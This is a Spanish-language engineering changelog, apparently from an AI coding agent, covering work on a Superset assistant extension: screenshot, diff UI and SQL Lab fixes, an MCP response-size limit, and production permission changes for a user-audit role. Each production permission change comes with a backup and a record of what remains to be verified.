- **Contra el servidor MCP real** (no solo lectura de código): la captura original del otro agente venció antes de terminar el fix (TTL 10 min), así que se generó una nueva vía `chart_screenshot_store.save_screenshot()` directo (220 004 bytes, tamaño similar al original) y se llamó a la tool con un cliente MCP propio (JWT, mismo patrón que `scripts/e2e_rbac.py`) contra `http://127.0.0.1:5009/mcp` tras el reinicio — confirmado `is_error: False`, 2 bloques de contenido (texto con la metadata + `image` JPEG, 293 340 caracteres base64), sin el error de tamaño.
- `build-extension.sh` no hizo falta para este fix puntual (es un cambio de `superset_config_test.py`, no de la extensión) — alcanza con reiniciar `superset_mcp_test.service`.

### 2026-09-30 (comando `/review`: revisión visual disponible en cualquier momento, no solo tras aplicar un cambio)

Cambio realizado:
El usuario, tras probar el flujo completo, pidió una mejora: mantener el botón contextual "Solicitar revisión visual" exactamente como está (aparece solo después de aplicar un cambio), pero agregar un comando `/review` que permita pedirla en CUALQUIER momento, sin depender de que haya un cambio recién aplicado.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/slashCommands.ts` — `SLASH_COMMANDS` gana `review`.
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ExploreAssistantPanel.tsx` — `handleCommand` enruta `/review <detalle opcional>` a `handleVisualReview` (la MISMA función que ya usaba el botón — sin duplicar lógica). `handleVisualReview` ahora también refleja busy/error en `commandNotice` (siempre visible, a diferencia del error propio de la tarjeta `ExploreVisualReviewPrompt`, que solo existe montada cuando hay un cambio recién aplicado) — así un error de `/review` disparado sin ningún cambio aplicado no se pierde en silencio.
- Tests: `slashCommands.test.ts` (+2: registro incluye `review`, `/review` parsea con y sin detalle; +1 test ajustado, `re` ahora matchea `resume` Y `review`) + `ExploreAssistantPanel.test.tsx` (+2: `/review` funciona sin ningún cambio recién aplicado — captura, sube, manda el mensaje igual que el botón; un error de `/review` en ese mismo escenario se ve en `commandNotice`) + 2 tests existentes ajustados (el mensaje de error ahora aparece DOS veces a propósito — en la tarjeta y en `commandNotice` — cuando ambas están montadas).

Que cambia o corrige:
- El usuario ya puede pedir la revisión visual cuando quiera, no solo inmediatamente después de aplicar un cambio — por ejemplo, para revisar algo que no notó hasta más tarde, sin tener que volver a aplicar nada.

Verificacion:
- 372/372 frontend (5 nuevos/ajustados). `tsc --noEmit` limpio.
- `build-extension.sh` completo, `.supx` reconstruido y copiado a `extensions_test/` (mismo build que trajo el fix de `excluded_tools` — ambos cambios van juntos en este build). Pendiente que el usuario reinicie `superset_mcp_test.service` Y `superset_test.service`.

### 2026-09-30 (fix real: la captura salía con el spinner de carga en vez del gráfico)

Cambio realizado:
Con el flujo end-to-end ya funcionando (backend+widget+adaptación del backend del chat, todo verificado), apareció un caso real: el modelo describió la captura como "un lienzo en blanco con un indicador de carga y el texto «Esperando por Postgresql...»" — la consulta SQL del gráfico todavía no había terminado cuando se disparó la captura. `captureChartScreenshot()` tomaba lo que hubiera en `.panel-body .chart-container` en el instante del click, sin esperar a que la consulta en curso terminara.

Causa raíz confirmada leyendo el código real de Superset (`superset-frontend/src/components/Chart/Chart.tsx`): `.chart-container` es el MISMO contenedor tanto para el spinner de "esperando la consulta" (`chartStatus === 'loading'`) como para el gráfico ya renderizado — ambos casos usan el componente compartido `Loading` (`@superset-ui/core/components`), que deja `data-test="loading-indicator"` en el DOM mientras está visible (confirmado leyendo su código fuente). Es la MISMA señal para el spinner "externo" (esperando la base) y el spinner "interno" (`renderChartContainer` cuando `shouldRenderChart()` todavía es false) — cualquiera de los dos deja ese marcador.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/adapters/chartScreenshotAdapter.ts` — nueva `waitForChartRendered(container)`: sondea `[data-test="loading-indicator"]` dentro del contenedor cada 300ms hasta que desaparece, con un tope de 30 segundos — si se agota, tira `ChartScreenshotError` con un mensaje claro ("El gráfico todavía está cargando...") en vez de capturar el spinner en silencio. Se llama al principio de `captureChartScreenshot()`, antes de `domToImage.toJpeg`.
- Tests nuevos en `chartScreenshotAdapter.test.ts` (+2, con `jest.useFakeTimers()`/`advanceTimersByTimeAsync` para no esperar 30s reales): el spinner desaparece antes del timeout → espera y captura recién entonces; el spinner nunca desaparece → rechaza con el mensaje claro, nunca llama a `domToImage.toJpeg`.

Que cambia o corrige:
- La captura ahora espera a que la consulta termine antes de capturar — nunca más un spinner en vez del gráfico real. Si el gráfico tarda más de 30s, el usuario ve un error claro pidiéndole que reintente, en vez de una imagen inútil.

Verificacion:
- 374/374 frontend (2 nuevos). `tsc --noEmit` limpio.
- `build-extension.sh` completo, `.supx` reconstruido y copiado a `extensions_test/`. Solo cambió frontend esta vez — alcanza con reiniciar `superset_test.service` (no hace falta `superset_mcp_test.service`).

### 2026-09-30 (rediseño visual del panel de Explore: diff estilo git con pestañas, tarjetas con badge, sección "por qué" colapsada)

Cambio realizado:
El usuario pidió mejorar la UI del panel de chat mostrando dos capturas: una del estado actual (para ver qué estaba mal) y una segunda, explícitamente marcada como "solo de referencia" (un mockup en tema oscuro, más limpio), pidiendo adaptarla — no copiarla pixel a pixel — y verificar que se integre bien con la funcionalidad y los datos reales. Se implementó en base al espíritu de la referencia, no a su literalidad: se mantuvo el botón "Deshacer" funcional (que la referencia omitía) y se descartó una fila "GRÁFICO ACTUAL: nombre · estado guardado" que hubiera requerido plomería nueva (no hay ningún lugar del código que hoy exponga `slice_name`) — decisión consciente, no olvido, pendiente de mencionarle al usuario.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/lineDiff.ts` (nuevo) — diff de líneas estilo git vía LCS (programación dinámica clásica O(n·m)): `computeLineDiff(before, after)` da líneas `context`/`added`/`removed` con número de línea de cada lado; `collapseContext(lines, contextSize)` colapsa tramos largos sin cambios a un solo marcador `···` (solo conserva contexto a N líneas de cualquier cambio); `hasLineChanges` para detectar "en realidad no cambió nada real, solo formato".
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ControlDiffView.tsx` (nuevo) — saca `CodeBlock`/`ControlDiffRow` de adentro de `ExploreAssistantPanel.tsx`. Para controles CSS/HTML (`styleTemplate`/`handlebarsTemplate`) con antes Y después definidos: 3 pestañas — "Cambios" (diff unificado con contexto colapsado, o el aviso "El formato no cambió — solo espacios/orden distintos al del modelo." si `hasLineChanges` da falso), "Antes", "Después" (el bloque completo, para cuando hace falta ver todo). Si falta un lado (control agregado/quitado entero) o no es CSS/HTML, sigue el resumen apilado de siempre, sin pestañas. Regla de contraste de `ui.ts` respetada al pie de la letra: el color semántico de una línea (`colorSuccess`/`colorError`) va SOLO en el fondo tenue (`colorSuccessBg`/`colorErrorBg`) y el borde izquierdo — el texto de la línea siempre es `colorText`/`colorTextSecondary`, nunca el color semántico directo.
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ExploreAssistantPanel.tsx` — nuevo `ActionCardHeader({ pendingCount, theme })`: ícono en una insignia circular con fondo `colorPrimaryBg`, título "Cambio propuesto" y una píldora redondeada "`N cambio(s) pendiente(s)`" (fondo `colorPrimaryBg`, texto `colorTextSecondary` — nunca `colorPrimary` como texto). Se usa en `ExploreActionCard` y `ExploreProposalChecklist`. `ExploreUndoBanner` pasa de una línea compacta amarilla (`colorWarningBg`) a una tarjeta verde de 2 líneas (`colorSuccessBg`, ícono de check, "Último cambio aplicado" en negrita + el detalle debajo en texto secundario), con el botón "Deshacer" funcional intacto (restyleado de `buttonIcon` a `buttonGhost`).
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ExploreConversation.tsx` — en `ExploreResultSummary`, el conteo de errores/warnings/infos sale del título y pasa a ser una píldora aparte (fondo `colorBgContainer`, borde del color del tono, texto `colorTextSecondary`); se corrigió el orden de prioridad del título para que `hasProposal` se chequee ANTES que `parts.length > 0` (antes estaba al revés, inconsistente con el cálculo de `tone` que ya priorizaba `hasProposal`). En `ExploreResultDetails`, la sección `<details>` con el razonamiento ahora arranca COLAPSADA (antes forzaba `open` siempre).
- Tests nuevos: `lineDiff.test.ts` (11, LCS + colapso de contexto + casos límite como string vacío) y `ControlDiffView.test.tsx` (5, pestañas por defecto en "Cambios", click cambia de pestaña, antes/después idénticos muestra el aviso de "no cambió", control no-CSS sin pestañas, control agregado sin pestañas).

Que cambia o corrige:
- El diff de CSS/HTML ahora se lee como un diff de git real (líneas +/- con contexto colapsado) en vez de dos bloques completos uno debajo del otro — mucho más fácil de ver qué cambió realmente en templates largos.
- Las tarjetas de propuesta tienen jerarquía visual clara (badge + píldora de conteo) en vez de solo texto plano.
- La sección de razonamiento ("por qué") ya no ocupa espacio por defecto — el usuario la abre si la quiere ver.
- El banner de deshacer es más legible (2 líneas, verde/éxito en vez de amarillo/advertencia — deshacer disponible no es una advertencia) sin perder la función.

Verificación:
- 390/390 frontend (390 = 374 previos + 5 de `ControlDiffView.test.tsx`, ya contaban con los 11 de `lineDiff.test.ts` sumados en el camino). `tsc --noEmit` limpio.
- `build-extension.sh` completo (388 backend + 390 frontend + webpack + empaquetado desde cero), `.supx` reconstruido y copiado a `extensions_test/`. Solo cambió frontend — alcanza con reiniciar `superset_test.service`.
- Pendiente: mostrarle el resultado real al usuario para confirmar que coincide con la intención de la imagen de referencia (no hubo instancia de confirmación antes de implementar, por pedido explícito de "adelante" implícito en el contexto de mejorar la UI) y mencionar la decisión consciente de no incluir la fila de "gráfico actual: nombre · estado guardado".

### 2026-10-05 (SQL Lab: impedir que una corrección parcial borre la consulta)

Cambio realizado:
La sesión `sqllab-1e0f4d101c59833f66e8fce009f5c866e09882d13ac73dec5133a221ea8d8915` recibió 802 líneas, pero dos respuestas ofrecieron solo un CTE de 20 líneas con `target=document`. La acción de aplicar reemplazaba el contenido completo del editor.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/adapters/sqlLabAdapter.ts` — valida que la pestaña y el SQL actuales coincidan con el snapshot de la propuesta; impide aplicar un CTE aislado como documento y bloquea reducciones drásticas al corregir un error.
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/SqlLabAssistantPanel.tsx` — entrega el snapshot al aplicar y al deshacer/rehacer para no sobrescribir cambios posteriores ni otra pestaña.
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/ActionCard.test.tsx` — regresiones para CTE parcial y SQL modificado después de generar la propuesta.

Verificación:
- Pruebas focalizadas: 23/23; TypeScript estricto sin errores.
- Build completo: 410/410 frontend, 388/388 backend y webpack correcto; paquete generado en `extensions_test/irex-mcp-tools-0.1.0.supx`.
- `sudo -n` requirió contraseña; el usuario reinició `superset_test.service` a las 15:12. Health de pruebas HTTP 200 y registro de la extensión confirmado. Producción de Superset no se modificó.
- Regresión adicional tras el build: 12/12 tests de ActionCard (incluye bloqueo de reescritura corta).

### 2026-10-05 (Producción: rol "Auditoria Crear Usuarios" — solo crear/modificar usuarios)

Cambio realizado:
Rol de auditoría que permite crear y editar usuarios, sin acceso a dashboards, charts, SQL Lab ni roles. Solo puede asignar "Permiso basico" y solo puede editar usuarios cuyos roles sean únicamente "Permiso basico" (antes y después del cambio). Así no puede editar Admins, a sí mismo ni usuarios con otros roles, ni subirse roles.

Cambios en la base de datos de producción (Postgres, `ab_permission_view_role`):
- Rol id 106 "Auditoria Crear Usuarios": 6 permisos asignados — `can_list`, `can_show`, `can_add`, `can_edit` sobre `UserDBModelView` (pv 26–29) y `menu_access` sobre "List Users" y "Security" (pv 168–169). No se conceden permisos de borrado, reset de contraseñas, API `User`/`Role` ni de roles/datasets/dashboards/SQL Lab.

Archivos afectados:
- `/home/imercados/.superset/superset_config.py` — nueva clase `AuditUserDBModelView(UserDBModelView)` con validación en `pre_add`/`pre_update` y filtro de roles asignables para el formulario; `CustomSecurityManager.userdbmodelview = AuditUserDBModelView`. Usa `class_permission_name = "UserDBModelView"` para reutilizar los permisos existentes.
- Respaldo previo: `scratchpad/superset_config.before_auditoria.py` (sesión c0a76c02...).

Verificación:
- `py_compile` del config sin errores. `superset.service` reiniciado a las 16:08 por el usuario; health HTTP 200.
- Permisos de `UserDBModelView` sin cambios (10 filas, igual que antes) y sin permisos nuevos con nombre de la clase de auditoría (total 802, igual).
- Log: aparece `Failed to sync configuration to database ... circular import 'BaseCommand'` en cada arranque, también antes de este cambio (4, 9 y 15 de octubre). No lo causa este cambio; queda pendiente de investigar.
- Pendiente: prueba funcional con un usuario del rol (ej. `orlando.madrigal`): crear usuario con "Permiso basico" OK; intentar asignar Admin o editar `admin` debe fallar con mensaje.

### 2026-10-05 (Producción: acceso al menú "Listar usuarios" y corrección de "Permiso basico")

Cambio realizado:
1. Rol "Auditoria Crear Usuarios" (106): se concede `can_read` sobre `security` (permission_view 818). Esto abre la ruta `/users/` (menú "Listar usuarios") y también las vistas de solo lectura de Logs, Roles, Grupos y registros de usuarios.
2. Rol "Permiso basico" (54): se quitan `can_edit` y `can_show` sobre `UserDBModelView` (permission_view 26 y 27). Antes, cualquier usuario con ese rol podía abrir `/users/edit/<id>` y cambiar los roles de otros usuarios, incluido Admin. Se conservan `can_userinfo`, `resetmypassword` y `userinfoedit`.

Archivos afectados:
- Base de datos de producción, tabla `ab_permission_view_role`: 1 fila insertada (rol 106, pv 818) y 2 filas eliminadas (rol 54, pv 26 y 27).
- Respaldo previo: `scratchpad/ab_permission_view_role.before2.csv` (sesión c0a76c02...).

Verificación:
- Consulta de permisos: el rol 106 tiene `can_read|security` y los cuatro permisos sobre `UserDBModelView`; el rol 54 ya no tiene `can_edit` ni `can_show` sobre `UserDBModelView`.
- Pendiente: probar con `irexti` que "Listar usuarios" abre la lista, y con un usuario normal de "Permiso basico" que `/users/edit/<id>` ya no permite editar.

### 2026-10-05 (Producción: enlace de menú "Listar usuarios" solo para el rol de auditoría)

Motivo: la página React `/users/` de Superset solo se registra para Admin (`isAdmin` en `superset-frontend/src/views/routes.tsx`). Para el rol de auditoría quedaba en blanco y no hacía peticiones. La vista de FAB `/users/list/` sí funciona, con la restricción de roles.

Cambios realizados:
1. `/home/imercados/.superset/superset_config.py` — en `CustomSecurityManager.register_views` se agrega `appbuilder.add_link("Listar usuarios", href="/users/list/", category="Security")`. FAB crea un permiso `menu_access` propio para este enlace. Respaldo previo: `scratchpad/superset_config.before_menu_link.py`.
2. Base de datos de producción, rol "Auditoria Crear Usuarios" (106): se revocan `can_read` sobre `security` (pv 818), que daba acceso a Logs, Roles y Grupos, y `menu_access` sobre "List Users" (pv 169), que llevaba a la página en blanco. Quedan `can_list`, `can_show`, `can_add`, `can_edit` sobre `UserDBModelView` y `menu_access` sobre "Security".

Pendiente:
- Reiniciar `superset.service` para cargar el enlace nuevo.
- Conceder `menu_access` sobre "Listar usuarios" al rol 106 (después del reinicio, cuando FAB haya creado el permiso).
- Probar con `irexti`: el menú debe mostrar "Listar usuarios" y abrir `/users/list/`.

Seguimiento (mismo día, tras reiniciar `superset.service` a las 16:37):
- `add_link` no crea el permiso del menú; FAB solo agrega el enlace. Se creó manualmente en la base: `ab_view_menu` "Listar usuarios", `ab_permission_view` (menu_access + "Listar usuarios") y la concesión al rol 106.
- Verificado: el rol 106 tiene `menu_access|Listar usuarios`, `menu_access|Security`, y los cuatro permisos sobre `UserDBModelView`.
- Un traceback en el arranque (16:37:49) es un 404 de un archivo estático, no relacionado.
- Pendiente: probar con `irexti` que el menú muestra "Listar usuarios" y abre `/users/list/`.

### 2026-10-05 (Corrección de la restricción de auditoría: error al guardar y selector de roles)

Problema reportado por `irexti` al inactivar a `pabloTest` (id 133):
- Error al guardar: `'AppBuilder' object has no attribute 'get_session'`. La consulta de roles usaba un atributo que no existe en FAB.
- El selector de roles mostraba solo "Permiso basico", porque el filtro de asignables también se aplicaba al editar. Al guardar, los roles no listados se perderían.

Verificación en base: `pabloTest` conserva sus roles (`Permiso basico`, `Ver Data Scanner`) y sigue activo; el fallo ocurrió antes de escribir.

Cambios en `/home/imercados/.superset/superset_config.py`:
- `_roles_en_bd`: `self.appbuilder.get_session` → `self.datamodel.session`.
- Se quita `edit_form_query_rel_fields`; el filtro de asignables queda solo para alta. La protección al editar sigue en `pre_update`.
- `pre_update`: si la validación rechaza el cambio, se hace `rollback()` de la sesión antes de lanzar el error.

Verificación: `py_compile` sin errores. Pendiente: reiniciar `superset.service` y probar con `irexti` (inactivar a `pabloTest` debe mostrar el mensaje de restricción y no cambiar nada).

### 2026-10-05 (Rol de auditoría: gestión completa de usuarios y roles, sin restricción)

Decisión del usuario: el rol de auditoría debe poder crear y modificar usuarios (incluidos los Admin), crear y modificar roles, y ver todos los roles. No se le da ningún menú adicional.

Consecuencia de seguridad: quien tenga este rol puede asignarse el rol Admin o modificar los permisos del rol Admin, es decir, equivale a Admin en gestión de usuarios y roles.

Cambios en la base de producción (rol 106 "Auditoria Crear Usuarios", `ab_permission_view_role`):
- Se agregan: `RoleModelView` `can_list`, `can_show`, `can_add`, `can_edit` (pv 37, 36, 38, 35); `UserDBModelView` `resetpasswords` (pv 33); `ResetPasswordView` `can_this_form_get` y `can_this_form_post` (pv 20 y 21).
- No se agregan: borrado de usuarios o roles, menús nuevos.

Cambios en `/home/imercados/.superset/superset_config.py`:
- Se elimina la restricción de roles: la clase `AuditUserDBModelView`, el filtro `FiltroRolesAsignables`, sus constantes, la línea `userdbmodelview` y el bloque de comentarios asociado. Vuelve la vista estándar de FAB.
- Se agrega un `before_request` en `register_views`: si un usuario autenticado sin rol Admin entra a `/users`, se redirige a `/users/list/`. Motivo: la página React `/users/` solo se renderiza para Admin.
- Import: `current_user` de `flask_login`.
- Respaldo previo: `scratchpad/superset_config.before_simplify.py`.

Pendiente: reiniciar `superset.service` y probar con `irexti`: entrar a `/users` (debe redirigir a `/users/list/`), editar a `pabloTest` y a `admin`, y ver la lista de roles en `/roles/list/`.


## 2026-10-08 - SQL Lab: MCP responses up to 50,000 tokens in test

- Canonical files: `custom-src/MCPResponseSizeGuard/patch_response_size_guard.py`
  and `test_response_size_guard.py`; migration step 18 in `migrate-plugins.sh`.
- Applied generated patch to `superset_v6_1_0/superset/mcp_service/middleware.py`:
  configuration-owned per-tool limits, including proxy resolution, without
  mutating the shared middleware or changing its 25,000-token default.
- `superset_config_test.py`: 50,000 tokens for `get_sql_schema_context`,
  `explain_query` and `check_query_nulls`; no production override or restart.
- Validation: existing guard tests plus regressions for concurrent chat/SQL Lab,
  proxy, the 50,000-token ceiling and invalid limits: 23 passed.
- Documentation: `PLUGINS.md`. No extension package rebuilt or promoted.

### Verificacion real del limite SQL Lab (2026-10-08)

Tras reiniciar solo superset_mcp_test.service, el mismo SQL de la sesion original
se verifico directamente sin llamar a un LLM. El middleware registro ~41.127
tokens (82% del limite activo de 50.000), y devolvio el plan ejecutado sin retirar
fuentes de la consulta. Las pruebas del guard siguen en 23 passed; ruff pasa.
No se reiniciaron servicios ni se cambio la configuracion de produccion.
